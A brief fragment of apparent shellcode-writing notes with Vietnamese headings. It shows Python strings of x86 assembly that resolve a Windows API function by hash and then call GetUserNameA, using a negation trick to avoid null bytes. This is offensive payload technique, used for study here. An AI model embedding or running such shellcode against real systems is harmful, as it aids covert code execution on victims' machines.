## Assembly:
### Tìm hàm
```
code += "push 0x5c52aa34;"
code += "call dword ptr [ebp+0x4];"
code += "mov [ebp + 0x10], eax;"
```
### Gọi hàm
```
# pcbBuffer
code += "mov eax, 0xfffffff0;" # max user length 10
code += "neg eax;"
code += "push eax;"
code += "push esp;"
# lpBuffer
code += "lea eax, [ebp + 0x24];" # save username in ebp + 0x24
code += "push eax;"
# call GetUserNameA
code += "call [ebp + 0x10];"
code += "mov ecx, [esp];"
```
